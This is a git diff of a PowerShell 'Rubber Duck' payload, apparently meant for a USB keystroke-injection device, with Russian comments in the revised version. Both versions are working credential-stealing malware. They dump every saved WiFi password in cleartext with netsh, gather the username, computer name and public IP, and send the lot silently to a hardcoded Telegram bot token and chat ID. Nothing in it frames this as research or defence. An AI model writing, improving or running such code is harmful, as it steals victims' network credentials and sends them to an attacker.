@@ -1,113 +1,86 @@
 <#
 .SYNOPSIS
-    Rubber Duck Data Collection Script - Fixed Version
+    Rubber Duck Data Collector - Stable Version
 .DESCRIPTION
-    Collects WiFi passwords and system info, then sends to Telegram bot.
+    Собирает системную информацию и пароли WiFi, отправляет в Telegram
 .NOTES
-    GitHub: https://github.com/OGRYZOK-dev/RubberDuck
+    Репозиторий: https://github.com/OGRYZOK-dev/RubberDuck
 #>
 
-# Configuration
+# Конфигурация
 $TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
 $CHAT_ID = "6525689863"
-$REPO_URL = "https://raw.githubusercontent.com/OGRYZOK-dev/RubberDuck/main/"
 
-# Function to send Telegram message (built-in to avoid module dependency)
-function Send-TelegramMessage {
-    param (
-        [string]$Message
-    )
+function Send-TelegramNotification {
+    param([string]$Message)
     
     $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
     $body = @{
         chat_id = $CHAT_ID
         text = $Message
+        disable_notification = $true
     }
     
     try {
-        $jsonBody = $body | ConvertTo-Json
-        Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json" -TimeoutSec 10 | Out-Null
+        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
         return $true
     }
     catch {
-        Write-Output "[!] Telegram send error: $_"
+        Write-Output "[Telegram Error] $_"
         return $false
     }
 }
 
-# Function to get WiFi passwords (built-in)
-function Get-WifiPasswords {
-    try {
-        $output = @()
-        $wifiProfiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object { $_.Split(":")[1].Trim() }
-        
-        if (-not $wifiProfiles) { return "No WiFi profiles found" }
+function Get-SystemInformation {
+    $info = @(
+        "🖥️ System Information",
+        "Computer: $env:COMPUTERNAME",
+        "User: $env:USERNAME",
+        "OS: $([System.Environment]::OSVersion.VersionString)",
+        "PowerShell: $($PSVersionTable.PSVersion)",
+        "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
+        "IP: $(try {(Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 3).Content} catch {'Unknown'})"
+    )
+    return $info -join "`n"
+}
 
-        foreach ($profile in $wifiProfiles) {
-            try {
-                $profileInfo = netsh wlan show profile name="$profile" key=clear
-                $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
-                
-                $output += "SSID: $profile"
-                $output += "Password: $password"
-                $output += "---------------------"
-            }
-            catch {
-                $output += "Error processing profile: $profile"
-                continue
-            }
+function Get-WiFiCredentials {
+    try {
+        $profiles = @()
+        $wifiData = netsh wlan show profiles | Where-Object { $_ -match "All User Profile" }
+        
+        foreach ($profile in $wifiData) {
+            $name = $profile.Split(":")[1].Trim()
+            $password = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()
+            $profiles += "📶 WiFi: $name"
+            $profiles += "🔑 Password: $password"
+            $profiles += "---------------------"
         }
         
-        return ($output -join "`n")
+        if ($profiles.Count -eq 0) { return "No WiFi profiles found" }
+        return $profiles -join "`n"
     }
     catch {
-        return "Error in WiFi module: $_"
+        return "[WiFi Error] $_"
     }
 }
 
-# Function to get system info (built-in)
-function Get-SystemInfo {
-    try {
-        $output = @()
-        
-        $output += "Computer Name: $env:COMPUTERNAME"
-        $output += "Username: $env:USERNAME"
-        $output += "OS Version: $([System.Environment]::OSVersion.VersionString)"
-        $output += "Date/Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        $output += "Public IP: $(try { (Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 3).Content } catch { 'Unknown' })"
-        
-        return ($output -join "`n")
-    }
-    catch {
-        return "Error in system module: $_"
-    }
-}
-
-# Main execution
+# Основной сбор данных
 try {
-    $result = @()
+    $report = @()
+    $report += Get-SystemInformation
+    $report += "`n`n🔐 WiFi Passwords:`n" + (Get-WiFiCredentials)
     
-    $result += "=== System Information ==="
-    $result += Get-SystemInfo
-    
-    $result += "`n=== WiFi Passwords ==="
-    $result += Get-WifiPasswords
-    
-    $finalOutput = $result -join "`n"
-    
-    # Truncate if too long for Telegram
-    if ($finalOutput.Length -gt 4000) {
-        $finalOutput = $finalOutput.Substring(0, 4000) + "...[TRUNCATED]"
+    # Отправка отчета
+    if ($report.Length -gt 4096) {
+        $report = $report.Substring(0, 4090) + "..."
     }
     
-    Send-TelegramMessage -Message $finalOutput
+    Send-TelegramNotification -Message $report
+    Write-Output "Data sent successfully"
 }
 catch {
-    $errorMsg = "Main execution error: $_"
-    try {
-        Send-TelegramMessage -Message $errorMsg
-    }
-    catch {
-        Write-Output $errorMsg
-    }
+    $errorMsg = "[Main Error] $_"
+    Write-Output $errorMsg
+    Send-TelegramNotification -Message $errorMsg
 }
